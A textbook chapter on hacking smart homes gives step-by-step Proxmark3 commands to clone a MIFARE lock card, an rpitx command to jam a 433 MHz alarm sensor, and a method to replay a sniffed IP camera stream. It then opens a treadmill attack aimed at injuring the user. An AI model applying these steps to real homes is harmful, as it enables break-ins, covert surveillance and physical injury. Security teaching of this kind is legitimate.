<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="371" id="Page_371"/>15</span><br/>
<span class="ChapterTitle">Hacking the Smart Home</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro">Common devices found in almost any modern home, such as TVs, refrigerators, coffee machines, HVAC systems, and even fitness equipment are now connected to each other and are capable of offering more services to users than ever before. You can set your desired home temperature while you’re driving, receive a notification when your washing machine has finished a load, turn on the lights and open window blinds automatically when you arrive home, or even have your TV stream a show directly to your phone.</p>
<p>At the same time, more and more businesses are equipped with similar devices, not just in meeting rooms, kitchens, or lounges. Many offices use IoT devices as part of critical systems, such as office alarms, security cameras, and door locks. </p>
<p>In this chapter, we perform three separate attacks to show how hackers can tamper with popular IoT devices used in modern smart homes and businesses. These demonstrations build on techniques we discussed <span epub:type="pagebreak" title="372" id="Page_372"/>throughout the book, so they should animate some of what you learned in earlier chapters. First, we show you how to gain physical entry to a building by cloning a smart lock card and disabling an alarm system. Next, we retrieve and stream footage from an IP security camera. Then we describe an attack to gain control of a smart treadmill and cause potentially life-threatening injuries.</p>
<h2 id="h1-500907c15-0001">Gaining Physical Entry to a Building</h2>
<p class="BodyFirst">Smart home security systems are undoubtedly a potential target for adversaries who want to gain access to a victim’s premises. Modern security systems are usually equipped with a touch keypad, a number of wireless door and window access sensors, motion radars, and an alarm base station with cellular and battery backup. The <em>base station</em>, which is the core of the whole system, handles all the identified security events. It’s internet connected and able to deliver emails and push notifications to the user’s mobile device. In addition, it’s often highly integrated with smart home assistants, such as Google Home and Amazon Echo. Many of these systems even support expansion kits that include face-tracking cameras with facial recognition capabilities, RFID-enabled smart door locks, smoke detectors, carbon monoxide detectors, and water leak sensors. </p>
<p>In this section, we’ll use techniques introduced in Chapter 10 to identify the RFID card used to unlock the apartment door’s smart lock, retrieve the key that protects the card, and clone the card to gain access to the apartment. Then we’ll identify the frequency that the wireless alarm system is using and try to interfere with its communication channels.</p>
<h3 id="h2-500907c15-0001">Cloning a Keylock System’s RFID Tag </h3>
<p class="BodyFirst">To gain physical access to a smart home, you first have to circumvent the smart door lock. These systems are mounted on the inside of existing door locks and come with an integrated 125 kHz/13.56 MHz proximity reader that allows users to pair key fobs and RFID cards. They can automatically unlock the door when you come home and securely lock it again when you leave. </p>
<p>In this section, we’ll use a Proxmark3 device, introduced in Chapter 10, to clone a victim’s RFID card and unlock their apartment door. You can find instructions on how to install and configure the Proxmark3 device in that chapter.</p>
<p>In this scenario, let’s imagine we can get close to the victim’s RFID card. We need to be near the wallet in which the victim stores the RFID card for only a few seconds.</p>
<h4 id="h3-500907c15-0001">Identifying the Kind of RFID Card Used</h4>
<p class="BodyFirst">First, we must identify the type of RFID card the door lock is using by scanning the victim’s card using Proxmark3’s <code>hf</code> search command. </p>
<span epub:type="pagebreak" title="373" id="Page_373"/><pre><code>$ proxmark3&gt;<b> </b><b>hf search</b><b> </b>
UID : 80 55 4b 6c           
ATQA : 00 04          
 SAK : 08 [2]          
<span class="CodeAnnotationHang">1</span> TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          
proprietary non iso14443-4 card found, RATS not supported          
  No chinese magic backdoor command detected          
<span class="CodeAnnotationHang">2</span> Prng detection: WEAK          
Valid ISO14443A Tag Found - Quiting Search</code></pre>
<p>The Proxmark3 tool detects the existence of a MIFARE Classic 1KB card <span class="CodeAnnotation">1</span>. The output also tests for a number of known card weaknesses that might allow us to interfere with the RFID card. Notably, we see that its <em>pseudorandom number generator</em><em>(PRNG)</em> is marked as weak <span class="CodeAnnotation">2</span>. The PRNG implements the RFID card’s authentication control and protects the data exchange between the RFID card and the RFID reader. </p>
<h4 id="h3-500907c15-0002">Performing a Darkside Attack to Retrieve a Sector Key</h4>
<p class="BodyFirst">We can leverage one of the detected weaknesses to identify the sector keys for this card. If we uncover the sector keys, we can entirely clone the data, and because the card contains all the information necessary for the door lock to identify the house owner, cloning the card allows adversaries to impersonate the victim.</p>
<p>As mentioned in Chapter 10, a card’s memory is divided into sectors, and to read the data of one sector, the card reader has to first authenticate using the corresponding sector key. The easiest attack that requires no previous knowledge regarding the card data is the Darkside attack. The <em>Darkside attack</em> uses a combination of a flaw in the card’s PRNG, a weak validation control, and a number of the card’s error responses to extract parts of a sector’s key. The PRNG provides weak random numbers; additionally, each time the card is powered up, the PRNG is reset to the initial state. As a result, if attackers pay close attention to timing, they can either predict the random number generated by the PRNG or even produce the desired random number at will. </p>
<p>You can perform the Darkside attack by providing the <code>hf mf mifare</code> command in the Proxmark3 interactive shell: </p>
<pre><code>proxmark3&gt; <b>hf mf mifare</b>
-------------------------------------------------------------------------
Executing command. Expected execution time: 25sec on average  :-)
Press the key on the proxmark3 device to abort both proxmark3 and client.
-------------------------------------------------------------------------uid(80554b6c) nt(5e012841) par(3ce4e41ce41c8c84) ks(0209080903070606) nr(2400000000)
|diff|{nr}    |ks3|ks3^5|parity         |
+----+--------+---+-----+---------------+
| 00 |00000000| 2 |  7  |0,0,1,1,1,1,0,0|
…
<span class="CodeAnnotationHang">1</span> Found valid key:ffffffffffff</code></pre>
<p><span epub:type="pagebreak" title="374" id="Page_374"/>You should be able to recover the key for one sector in 1 to 25 seconds. The key we recovered is one of the default keys for this type of RFID card <span class="CodeAnnotation">1</span>. </p>
<h4 id="h3-500907c15-0003">Performing a Nested Authentication Attack to Retrieve the Remaining Sector Keys</h4>
<p class="BodyFirst">Once you know at least one sector key, you can perform a faster attack called nested authentication to retrieve the rest of the sector keys, which you need to clone the data in the rest of the sectors. A <em>nested authentication</em> attack allows you to authenticate to one sector and hence establish an encrypted communication with the card. A subsequent authentication request by the adversary for another sector will force the authentication algorithm to execute again. (We went over the details of this authentication algorithm in Chapter 10.) But this time, the card will generate and send a challenge, which an attacker can predict as a result of the PRNG vulnerability. The challenge will be encrypted with the corresponding sector’s key. Then a number of bits will be added to this value to reach a certain parity. If you know the predictable challenge with its parity bits and its encrypted form, you can infer parts of the sector’s key.</p>
<p>You can perform this attack using the <code>hf mf nested</code> command, followed by a number of parameters: </p>
<pre><code>proxmark3&gt; <b>hf mf nested 1 0 A FFFFFFFFFFFF t</b>
Testing known keys. Sector count=16          
nested...          
-----------------------------------------------
Iterations count: 0     
|---|----------------|---|----------------|---|          
|sec|key A           |res|key B           |res|          
|---|----------------|---|----------------|---|          
|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
…</code></pre>
<p>The first parameter specifies the card memory (because it’s 1KB, we use the value <code>1</code>); the second parameter specifies the sector number for which the key is known; the third parameter defines the key type of the known key (either <code>A</code> or <code>B </code>in a MIFARE card); the fourth parameter is the previously extracted key; and the <code>t</code> parameter asks to transfer the keys into the Proxmark3 memory. When the execution finishes, you should see a matrix with the two key types for each sector.</p>
<h4 id="h3-500907c15-0004">Loading the Tag into Memory</h4>
<p class="BodyFirst">Now it’s possible to load the tag into the Proxmark3 emulator’s memory using the <code>hf mf ecfill </code>command. The <code>A</code> parameter specifies, again, that the tool should use the authentication key type <code>A (0x60)</code>:</p>
<pre><code>proxmark3&gt; <b>hf mf ecfill A</b>
#db# EMUL FILL SECTORS FINISHED        </code></pre>
<h4 id="h3-500907c15-0005"><span epub:type="pagebreak" title="375" id="Page_375"/>Testing the Cloned Card</h4>
<p class="BodyFirst">Next, you can approach the door lock and emulate the cloned tag by reading and writing the contents stored in the Proxmark3 memory using the <code>hf mf sim </code>command. There’s no need to write the contents to a new card, because Proxmark3 can mimic the RFID card.</p>
<pre><code>proxmark3&gt; <b>hf mf sim</b>
uid:N/A, numreads:0, flags:0 (0x00)           
#db# 4B UID: 80554b6c</code></pre>
<p>Note that not all MIFARE Classic cards are vulnerable to these two attacks. For attacks against other types of RFID cards and fobs, see the techniques discussed in Chapter 10. For simpler key fobs that don’t enforce an authentication algorithm, you can also use cheap key fob duplicators, such as Keysy from TINYLABS. Explore the supported key fob models on its website at <a href="https://tinylabs.io/keysy/keysy-compatibility/" class="LinkURL">https://tinylabs.io/keysy/keysy-compatibility/</a><em>.</em></p>
<h3 id="h2-500907c15-0002">Jamming the Wireless Alarm</h3>
<p class="BodyFirst">The Darkside attack allowed you to easily gain entry to the victim’s premises. But the apartment might also be equipped with an alarm system that can detect a security breach and activate a fairly loud warning through its embedded siren. Also, it can rapidly inform the victims about the breach by sending a notification to their mobile phones. Even if you’ve circumvented the door lock, opening the door will cause a wireless door access sensor to trigger this alarm system. </p>
<p>One way to overcome this challenge is to disrupt the communication channel between the wireless sensors and the alarm system base station. You can do this by jamming the radio signals that the sensors transmit to the alarm’s base. To perform a <em>jamming attack</em>, you’ll have to transmit radio signals in the same frequency that the sensors use, and as a result, decrease the communication channel’s <em>signal-to-noise ratio</em><em>(SNR)</em>. The SNR is a ratio of the power of the meaningful signal that reaches the base station from the sensors to the power of the background noise also reaching the base station. A decreased SNR ratio blocks the base station from hearing communications from the door access sensor. </p>
<h4 id="h3-500907c15-0006">Monitoring the Alarm System’s Frequency</h4>
<p class="BodyFirst">In this section, we’ll set up a <em>software defined radio</em><em>(SDR)</em> using a low-cost RTL-SDR DVB-T dongle (<a id="figureanchor15-1" href="#figure15-1">Figure 15-1</a>). We’ll use it to listen to the frequency coming from the alarm so we can transmit signals of the same frequency later. </p>
<span epub:type="pagebreak" title="376" id="Page_376"/><figure>
<img src="Images/f15001.png" alt="f15001" width="750" height="214"/>
<figcaption><p><a id="figure15-1">Figure 15-1:</a> A cheap RTL-SDR DVB-T dongle and an alarm system with a wireless door access sensor</p></figcaption>
</figure>
<p>To replicate this experiment, you can use most DVB-T dongles equipped with a <em>Realtek RTL2832U</em> chipset. The driver for the RTL2832U is preinstalled in Kali Linux. Enter the following command to verify that your system detects the DVB-T dongle:</p>
<pre><code> $ <b>rtl_test</b>
Found 1 device(s):
  0:  Realtek, RTL2838UHIDIR, SN: 00000001</code></pre>
<p>To convert the radio spectrum into a digital stream that we can analyze, we need to download and execute the CubicSDR binary (<a href="https://github.com/cjcliffe/CubicSDR/releases/" class="LinkURL">https://github.com/cjcliffe/CubicSDR/releases/</a>).  </p>
<p>Most wireless alarm systems use one of the few unlicensed frequency bands, such as the 433 MHz band. Let’s start by monitoring the frequency at 433 MHz when the victim opens or closes a door that is equipped with a wireless access sensor. To do this, use the <code>chmod </code>utility, which is preinstalled in Linux platforms, followed by the <code>+x</code> parameter to make the binary executable:</p>
<pre><code> $ <b>chmod +x CubicSDR-0.2.5-x86_64.AppImage</b></code></pre>
<p>Run the binary using the following command; the CubicSDR interface should appear: </p>
<pre><code>$ <b>./CubicSDR-0.2.5-x86_64.AppImage</b></code></pre>
<p>The application should list the detected devices that you can use. Select the RTL2932U device and click <b>Start</b>, as shown in<em> </em><a id="figureanchor15-2" href="#figure15-2">Figure 15-2</a>.</p>
<span epub:type="pagebreak" title="377" id="Page_377"/><figure>
<img src="Images/f15002.png" alt="f15002" width="750" height="496"/>
<figcaption><p><a id="figure15-2">Figure 15-2:</a> CubicSDR device selection </p></figcaption>
</figure>
<p>To select a frequency, move the mouse pointer over the value listed in the<em> </em><b>Set Center Frequency</b> box<em> </em>and press the spacebar. Then enter the value <b>433MHz</b>, as shown in <a id="figureanchor15-3" href="#figure15-3">Figure 15-3</a>.</p>
<figure>
<img src="Images/f15003.png" alt="f15003" width="750" height="340"/>
<figcaption><p><a id="figure15-3">Figure 15-3:</a> CubicSDR Frequency selection</p></figcaption>
</figure>
<p>You can view the frequency in CubicSDR, as shown in <a id="figureanchor15-4" href="#figure15-4">Figure 15-4</a>.</p>
<figure>
<img src="Images/f15004.png" alt="f15004" width="750" height="348"/>
<figcaption><p><a id="figure15-4">Figure 15-4:</a> The CubicSDR listening at 433 MHz</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="378" id="Page_378"/>Every time the victim opens or closes the door, you should see a little green peak in the diagram. Stronger peaks will appear in yellow or red, indicating the exact frequency that the sensor is transmitting.</p>
<h4 id="h3-500907c15-0007">Transmitting a Signal at the Same Frequency Using the Raspberry Pi</h4>
<p class="BodyFirst">Using the open source <em>Rpitx</em> software, you can transform a Raspberry Pi into a simple radio transmitter that can handle frequencies from 5 kHz to 1,500 MHz. The Raspberry Pi is a low-cost, single-board computer that is useful for many projects. Any Raspberry Pi model running a lite Raspbian operating system installation, except for the Raspberry Pi B, can currently support Rpitx.</p>
<p>To install and run Rpitx, first connect a wire to the exposed GPIO 4 pin on the Raspberry Pi, as shown in <a id="figureanchor15-5" href="#figure15-5">Figure 15-5</a>. You can use any commercial or custom wire for this purpose. </p>
<figure>
<img src="Images/f15005.png" alt="f15005" width="750" height="335"/>
<figcaption><p><a id="figure15-5">Figure 15-5:</a> The Raspberry Pi GPIO 4 pin</p></figcaption>
</figure>
<p>Use the <code>git</code> command to download the app from the remote repository. Then navigate to its folder and run the <em>install.sh</em> script: </p>
<pre><code>$ <b>git clone </b><b>http</b><b>s://github.com/F5OEO/rpitx</b>
$ <b>cd rpitx &amp;&amp; ./install.sh</b></code></pre>
<p>Now reboot the device. To start the transmission, use the <code>rpitx</code> command.</p>
<pre><code>$ <b>sudo ./rpitx –m VFO –f 433850</b></code></pre>
<p><span epub:type="pagebreak" title="379" id="Page_379"/>The <code>-m</code> parameter defines the transmission mode. In this case, we set it to <code>VFO</code> to transmit a constant frequency. The <code>-f</code> parameter defines the frequency to output on the Raspberry Pi’s GPIO 4 pin in kilohertz.</p>
<p>If you connect the Raspberry Pi to a monitor, you can use the Rpitx graphic user interface to tune the transmitter further, as shown in <a id="figureanchor15-6" href="#figure15-6">Figure 15-6</a>.</p>
<figure>
<img src="Images/f15006.png" alt="f15006" width="670" height="275"/>
<figcaption><p><a id="figure15-6">Figure 15-6:</a> Rpitx GUI transmitter options</p></figcaption>
</figure>
<p>We can verify that the signal is transmitted at the correct frequency by making a new capture using the RTL-SDR DVB-T dongle. Now you can open the door without triggering the alarm.</p>
<p>If you’re using Rpitx version 2 or later, you could also record a signal directly from the RTL-SDR DVB-T dongle and replay it at the same frequency through the provided graphic user interface. In this case, you wouldn’t need to use CubicSDR. We leave this as an exercise for you to complete. You could try this feature against alarm systems that offer a remote controller for activating or deactivating the alarm.</p>
<p>It’s possible that more expensive, highly sophisticated alarm systems will detect the noise in the wireless frequency and attempt to notify the user about this event. To avoid this, you could attempt to jam the alarm system base station’s Wi-Fi connectivity by performing a deauthentication attack, as discussed in Chapter 12. Refer to that chapter for more information about using the Aircrack-ng suite. </p>
<h2 id="h1-500907c15-0002">	Playing Back an IP Camera Stream</h2>
<p class="BodyFirst">Suppose you’re an attacker who has somehow gained access to a network that includes IP cameras. Now, what could constitute an impactful attack that has significant privacy implications and that you could conduct without even touching the cameras? Playing back the camera video stream, of course. Even if the cameras have no vulnerabilities (highly unlikely!), an attacker who gains a man-in-the-middle position on the network could capture traffic from any potential insecure communication channels. The bad (or good, depending on your perspective) news is that many current cameras still use <span epub:type="pagebreak" title="380" id="Page_380"/>unencrypted network protocols to stream their video. Capturing the network traffic is one thing, but being able to demonstrate to stakeholders that it’s possible to play back the video from that dump is another. </p>
<p>You can easily achieve the man-in-the-middle position using techniques like ARP cache poisoning or DHCP spoofing (first introduced in Chapter 3) if the network has no segmentation. In the camera video stream example, we assume that this has already been achieved and that you’ve captured a network camera’s <em>pcap</em> file streaming through the Real Time Streaming Protocol (RTSP), the Real-time Transport Protocol (RTP), and the RTP Control Protocol (RTCP), which are discussed in the next section. </p>
<h3 id="h2-500907c15-0003">Understanding Streaming Protocols</h3>
<p class="BodyFirst">The RTSP, RTP, and RTCP protocols usually work in conjunction with one another. Without delving too much into their inner workings, here is a quick primer on each: </p>
<ol class="none">
<li><span class="RunInHead">RTSP</span>  Is a client-server protocol that acts as a network remote control for multimedia servers with live feeds and stored clips as data sources. You can imagine RTSP as the protocol overlord that can send VHS-style multimedia playback commands, such as play, pause, and record. RTSP usually runs over TCP. </li>
<li><span class="RunInHead">RTP </span>  Performs the transmission of the media data. RTP runs over UDP and works in concert with RTCP. </li>
<li><span class="RunInHead">RTCP </span>  Periodically sends out-of-band reports that announce statistics (for example, the number of packets sent and lost and the jitter) to the RTP participants. Although RTP is typically sent on an even-numbered UDP port, RTCP is sent over the next highest odd-number UDP port: you can spot this in the Wireshark dump in <a id="figureanchor15-7" href="#figure15-7">Figure 15-7</a>.</li>
</ol>
<h3 id="h2-500907c15-0004">Analyzing IP Camera Network Traffic</h3>
<p class="BodyFirst">In our setup, the IP camera has the IP address 192.168.4.180 and the client that is intended to receive the video stream has the IP address 192.168.5.246. The client could be the user’s browser or a video player, such as VLC media player. </p>
<p>As a man-in-the-middle positioned attacker, we’ve captured the conversation that <a href="#figure15-7">Figure 15-7</a> shows in Wireshark. </p>
<figure>
<img src="Images/f15007.png" alt="f15007" width="754" height="137"/>
<figcaption><p><a id="figure15-7">Figure 15-7:</a> Wireshark output of a typical multimedia session established through RTSP and RTP</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="381" id="Page_381"/>The traffic is a typical multimedia RTSP/RTP session between a client and an IP camera. The client starts by sending an <code>RTSP OPTIONS </code>request <span class="CodeAnnotation">1</span> to the camera. This request asks the server about the request types it will accept. The accepted types are then contained in the server’s <code>RTSP REPLY</code><span class="CodeAnnotation">2</span>.<code/>In this case, they’re <code>DESCRIBE</code><em>, </em><code>SETUP</code><em>, </em><code>TEARDOWN</code><em>, </em><code>PLAY</code><em>, </em><code>SET_PARAMETER</code><em>, </em><code>GET_PARAMETER</code><em>, </em>and <code>PAUSE </code>(some readers might find these familiar from the VHS days), as shown in <a id="figureanchor15-8" href="#figure15-8">Figure 15-8</a>.</p>
<figure>
<img src="Images/f15008.png" alt="f15008" width="754" height="226"/>
<figcaption><p><a id="figure15-8">Figure 15-8:</a> The camera’s <code>RTSP OPTIONS</code> reply contains the request types it accepts.</p></figcaption>
</figure>
<p>Then the client sends an <code>RTSP DESCRIBE</code> request <span class="CodeAnnotation">3</span> that includes an <code>RTSP URL</code> (a link for viewing the camera feed, which in this case is <em>rtsp://192.168.4.180:554/video.mp4</em>). With this request <span class="CodeAnnotation">3</span> the client is asking the URL’s description and will notify the server with the description formats the client understands by using the <code>Accept </code>header in the form <code>Accept: application/sdp</code>. The server’s reply <span class="CodeAnnotation">4</span> to this is usually in the Session Description Protocol (SDP) format shown in <a id="figureanchor15-9" href="#figure15-9">Figure 15-9</a>. The server’s reply is an important packet for our proof of concept, because we’ll use that information to create the basis of an SDP file. It contains important fields, such as media attributes (for example, encoding for the video is H.264 with a sample rate of 90,000 Hz) and which packetization modes will be in use.</p>
<figure>
<img src="Images/f15009.png" alt="f15009" width="750" height="185"/>
<figcaption><p><a id="figure15-9">Figure 15-9:</a> The camera’s RTSP reply to the <code>DESCRIBE</code> request includes the SDP part.</p></figcaption>
</figure>
<p>The next two RTSP requests are <code>SETUP</code> and <code>PLAY</code>. The former asks the camera to allocate resources and start an RTSP session; the latter asks to start sending data on the stream allocated via <code>SETUP</code>. The <code>SETUP</code> request <span class="CodeAnnotation">5</span> includes the client’s two ports for receiving RTP data (video and audio) and RTCP data (statistics and control info). The camera’s reply <span class="CodeAnnotation">6</span> to the <code>SETUP</code> request confirms the client’s ports and adds the server’s corresponding chosen ports, as shown in <a id="figureanchor15-10" href="#figure15-10">Figure 15-10</a>.</p>
<span epub:type="pagebreak" title="382" id="Page_382"/><figure>
<img src="Images/f15010.png" alt="f15010" width="750" height="72"/>
<figcaption><p><a id="figure15-10">Figure 15-10:</a> The camera’s reply to the client’s <code>SETUP</code> request </p></figcaption>
</figure>
<p>After the <code>PLAY</code> request <span class="CodeAnnotation">7</span>, the server starts transmitting the RTP stream <span class="CodeAnnotation">8</span> (and some RTCP packets) <span class="CodeAnnotation">9</span>. Return to <a href="#figure15-7">Figure 15-7</a> to see that this exchange happens between the <code>SETUP</code> request’s agreed-upon ports. </p>
<h3 id="h2-500907c15-0005">Extracting the Video Stream</h3>
<p class="BodyFirst">Next, we need to extract the bytes from the SDP packet and export them into a file. Because the SDP packet contains important values about how the video is encoded, we need that information to play back the video. You can extract the SDP packet by selecting the <b>RTSP/SDP</b> packet in the Wireshark main window, selecting the <b>Session Description Protocol</b> part of the packet, and then right-clicking and selecting <b>Export Packet Bytes</b> (<a id="figureanchor15-11" href="#figure15-11">Figure 15-11</a>). Then save the bytes into a file on the disk. </p>
<figure>
<img src="Images/f15011.png" alt="f15011" width="750" height="339"/>
<figcaption><p><a id="figure15-11">Figure 15-11:</a> Select the SDP part of the RTSP packet in Wireshark and Export Packet Bytes to a file.</p></figcaption>
</figure>
<p>The created SDP file will look something like <a id="listinganchor15-1" href="#listing15-1">Listing 15-1</a>.</p>
<pre><code>v=0
<span class="CodeAnnotationHang">1</span> o=- 0 0 IN IP4 192.168.4.180
<span class="CodeAnnotationHang">2</span> s=LIVE VIEW
<span class="CodeAnnotationHang">3</span> c=IN IP4 0.0.0.0
t=0 0
a=control:*
<span class="CodeAnnotationHang">4</span> m=video 0 RTP/AVP 35
a=rtpmap:35 H264/90000
a=rtpmap:102 H265/90000
a=control:video
a=recvonly
<span epub:type="pagebreak" title="383" id="Page_383"/>a=fmtp:35 packetization-mode=1;profile-level-id=4d4033;sprop-parameter-sets=Z01AM42NYBgAbNgLUBDQECA=,aO44gA==</code></pre>
<p class="CodeListingCaption"><a id="listing15-1">Listing 15-1:</a> The original SDP file as saved by exporting the SDP packet from the Wireshark dump</p>
<p>We’ve marked the most important parts of the file that we need to modify. We see the session owner (<code>-</code>), the session id (<code>0</code>), and the originator’s network address <span class="CodeAnnotation">1</span>. For accuracy, because the originator of this session will be our localhost, we can change the IP address to 127.0.0.1 or delete this line entirely. Next, we see the session name <span class="CodeAnnotation">2</span>. We can omit this line or leave it as-is. If we leave it, the string <code>LIVE VIEW</code> will briefly appear when VLC plays back the file. Then we see the listening network address <span class="CodeAnnotation">3</span>. We should change this to 127.0.0.1 so we don’t expose the FFmpeg tool we’ll use later on the network, because we’ll only be sending data to FFmpeg locally through the loopback network interface. </p>
<p>The most important part of the file is the value that contains the network port for RTP <span class="CodeAnnotation">4</span>. In the original SDP file, this is <code>0</code>, because the port was negotiated later through the RTSP <code>SETUP</code> request. We’ll have to change this port to a valid non-zero value for our use-case. We arbitrarily chose <code>5000</code>. <a id="listinganchor15-2" href="#listing15-2">Listing 15-2</a> displays the modified SDP file. We saved it as <em>camera.sdp</em>. </p>
<pre><code>v=0
c=IN IP4 127.0.0.1
m=video 5000 RTP/AVP 35
a=rtpmap:35 H264/90000
a=rtpmap:102 H265/90000
a=control:video
a=recvonly
a=fmtp:35 packetization-mode=1;profile-level-id=4d4033;sprop-parameter-sets=Z01AM42NYBgAbNgLUBDQECA=,aO44gA==</code></pre>
<p class="CodeListingCaption"><a id="listing15-2">Listing 15-2:</a> The modified SDP file</p>
<p>The second step is to extract the RTP stream from Wireshark. The RTP stream contains the encoded video data. Open the <em>pcap</em> file that contains the captured RTP packets in Wireshark; then click <b>Telephony</b><span class="MenuArrow">▶</span><b>RTP Streams</b>. Select the stream shown, right-click it, and select <b>Prepare Filter</b>. Right-click again and select <b>Export as RTPDump</b>. Then save the selected RTP stream as an <em>rtpdump</em> file (we saved it as <em>camera.rtpdump</em>).</p>
<p>To extract the video from the <em>rtpdump</em> file and play it back, you’ll need the following tools: RTP Tools to read and play back the RTP session, FFmpeg to convert the stream, and VLC to play back the final video file. If you’re using a Debian-based distribution like Kali Linux, you can easily install the first two using<b> </b><code>apt</code>:</p>
<pre><code>$ <b>apt-get install vlc</b>
$ <b>apt-get install ffmpeg</b></code></pre>
<p><span epub:type="pagebreak" title="384" id="Page_384"/>You’ll have to download the RTP Tools manually either from its website (<a href="https://github.com/irtlab/rtptools/" class="LinkURL">https://github.com/irtlab/rtptools/</a>) or its GitHub repository. Using <code>git</code>, you can clone the latest version of the GitHub repository:</p>
<pre><code>$ <b>git clone https://github.com/cu-irt/rtptools.git</b></code></pre>
<p>Then compile the RTP Tools::</p>
<pre><code>$ <b>cd rtptools</b>
$ <b>./configure &amp;&amp; make</b></code></pre>
<p>Next, run FFmpeg using the following options: </p>
<pre><code>$ <b>ffmpeg -v warning -protocol_whitelist file,udp,rtp -f sdp -i camera.sdp -copyts -c copy -y</b>
<b>  out.mkv </b></code></pre>
<p>We whitelist the allowed protocols (file, UDP, and SDP) because it’s a good practice. The <code>-f</code> switch forces the input file format to be SDP regardless of the file’s extension. The <code>-i</code> option supplies the modified <em>camera.sdp</em> file as input. The <code>-copyts</code> option means that input timestamps won’t be processed. The <code>-c copy</code> option signifies that the stream is not to be re-encoded, only outputted, and <code>-y</code> overwrites output files without asking. The final argument (<em>out.mkv</em>) is the resulting video file.</p>
<p>Now run RTP Play, providing the path of the <em>rtpdump</em> file as an argument to the <code>-f</code> switch: </p>
<pre><code>~/rtptools-1.22$ <b>./rtpplay -T -f</b><b> </b><b>../</b><b>camera</b><b>.rtpdump 127.0.0.1/5000</b></code></pre>
<p>The last argument is the network address destination and port that the RTP session will be played back to. This needs to match the one FFmpeg read through the SDP file (remember that we chose <code>5000</code> in the modified <em>camera.sdp</em> file).</p>
<p>Note that you must execute the <code>rtpplay</code> command immediately after you start FFmpeg, because by default FFmpeg will terminate if no incoming stream arrives soon. The FFmpeg tool will then decode the played-back RTP session and output the <em>out.mkv</em> file.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>If you’re using Kali Linux, as we are in this video example, you should run all relevant tools as a nonroot user. The reason is that malicious payloads could exist anywhere, and there are notorious memory corruption vulnerabilities in complex software like video encoders and decoders.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Then VLC will gloriously be able to play the video file: </p>
<pre><code>$ <b>vlc out.mkv </b></code></pre>
<p>When you run this command, you should witness the captured camera video feed. You can watch a video demonstration of this technique on this book’s website at <a href="https://nostarch.com/practical-iot-hacking/" class="LinkURL">https://nostarch.com/practical-iot-hacking/</a>.</p>
<p><span epub:type="pagebreak" title="385" id="Page_385"/>There are ways to securely transmit video streams that would prevent man-in-the-middle attacks, but few devices currently support them. One solution would be to use the newer <em>Secure RTP (SRTP)</em> protocol that can provide encryption, message authentication, and integrity, but note that these features are optional and could be disabled. People might disable them to avoid the performance overhead of encryption, because many embedded devices don’t have the necessary computational power to support it. There are also ways to separately encrypt RTP, as described at RFC 7201. Methods include using IPsec, RTP over TLS over TCP, or RTP over Datagram TLS (DTLS). </p>
<h2 id="h1-500907c15-0003">Attacking a Smart Treadmill</h2>
<p class="BodyFirst">As an attacker, you now have unrestricted access to the user’s premises and you can check whether you appear in their security footage by playing back the video. The next step is to use your physical access to perform further attacks on other smart devices to extract sensitive data or even make them perform unwanted actions. What if you could turn all these smart devices against their owner while making it look like an accident?</p>
<p>A good example of smart home devices that you can exploit for such malicious purposes are those related to fitness and wellness, such as exercise and movement trackers, electric connected toothbrushes, smart weight scales, and smart exercise bikes. These devices can collect sensitive data about a user’s activities in real time. Some of them can also affect the user’s health. Among other features, the devices might be equipped with high-quality sensors designed to sense a user’s condition; <em>activity tracking systems</em> responsible for monitoring the user’s performance; cloud computing capabilities to store and process the collected data on a daily basis; internet connectivity that offers real-time interaction with users of similar devices; and multimedia playback that transforms the fitness device into a state-of-the-art infotainment system. </p>
<p>In this section, we’ll describe an attack against a device that combines all these amazing features: the smart powered treadmill, as shown in <a id="figureanchor15-12" href="#figure15-12">Figure 15-12</a>.</p>
<p>Smart treadmills are one of the most fun ways to exercise in the home or gym, but you can get injured if the treadmill malfunctions. </p>
<p>The attack described in this section is based on a presentation given at the 2019 IoT security conference Troopers by Ioannis Stais (one of the authors of this book) and Dimitris Valsamaras. As a security measure, we won’t disclose the smart treadmill vendor’s name or the exact device model. The reason is that even though the vendor did address the issues very quickly by implementing the proper patches, these devices aren’t necessarily always connected to the internet, and as a result, might have not been updated yet. That said, the identified issues are textbook vulnerabilities often found in smart devices; they’re very indicative of what can go wrong with an IoT device in a modern smart home.</p>
<span epub:type="pagebreak" title="386" id="Page_386"/><figure>
<img src="Images/f15012.png" alt="f15012" width="750" height="391"/>
<figcaption><p><a id="figure15-12">Figure 15-12:</a> A modern smart treadmill</p></figcaption>
</figure>
<h3 id="h2-500907c15-0006">Smart Treadmills and the Android Operating System</h3>
<p class="BodyFirst">Many smart treadmills use the Android operating system, which runs on more than a billion phones, tablets, watches, and televisions. By using Android in a product, you’re automatically granted significant benefits; for example, specialized libraries and resources for fast app development, and mobile apps, already available on the Google Play Store, that can be directly integrated into a product. Also, you have the support of an extended device ecosystem of all shapes and sizes that includes smartphones, tablets (AOSP), cars (Android Auto), smartwatches (Android Wear), TVs (Android TV), embedded systems (Android Things), and extensive official documentation that comes with online courses and training material for developers. Additionally, many original equipment manufacturers and retailers can provide compatible hardware parts.</p>
<p>But every good thing comes with a price: the adopted system risks becoming too generic It also provides far more functionality than required, increasing the product’s overall attack surface. Often, the vendors include custom apps and software that lack proper security audits and circumvent the existing platform security controls to achieve primary functions for their product, such as hardware control, as shown in <a id="figureanchor15-13" href="#figure15-13">Figure 15-13</a>.</p>
